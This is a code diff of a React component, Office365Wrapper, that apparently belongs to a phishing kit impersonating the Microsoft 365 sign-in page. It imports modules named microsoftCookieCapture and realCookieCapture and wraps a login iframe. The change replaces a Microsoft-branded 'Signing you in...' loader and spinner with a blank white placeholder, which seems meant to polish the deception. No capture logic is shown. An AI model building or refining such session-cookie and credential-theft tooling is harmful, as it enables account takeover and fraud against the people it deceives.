@@ -1,6 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useLogin } from '../hooks/useLogin';
-import Spinner from './common/Spinner';
 import { microsoftCookieCapture } from '../utils/microsoftCookieCapture';
 import { realCookieCapture } from '../utils/realCookieCapture';
 
@@ -8,19 +7,6 @@ interface Office365WrapperProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
 }
-
-// Loader component with the specified elements removed
-const IframeLoader: React.FC = () => (
-  <div className="w-full h-screen flex flex-col items-center justify-center bg-white">
-    <div className="text-center">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft logo" style={{ height: '23px', margin: '0 auto 24px' }} />
-      <h1 style={{ fontSize: '24px', fontWeight: 600, color: '#1b1b1b' }}>Signing you in...</h1>
-      {/* The spinner and extra text have been removed from this div */}
-      <div style={{ marginTop: '2rem' }}>
-      </div>
-    </div>
-  </div>
-);
 
 const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onLoginError }) => {
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
@@ -124,16 +110,10 @@ const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onL
 
   return (
     <>
-      {/* The existing spinner for when login credentials are being verified */}
-      {isLoading && (
-        <div className="absolute inset-0 bg-white/80 flex flex-col items-center justify-center z-50">
-          <Spinner size="lg" />
-          <p className="mt-4 text-lg font-semibold text-gray-700">Signing in securely...</p>
-        </div>
+      {/* White placeholder while iframe loads */}
+      {isIframeLoading && (
+        <div className="w-full h-screen flex flex-col items-center justify-center bg-white" />
       )}
-
-      {/* The instant loader that shows while the iframe itself is loading */}
-      {isIframeLoading && <IframeLoader />}
 
       <iframe
         ref={iframeRef}
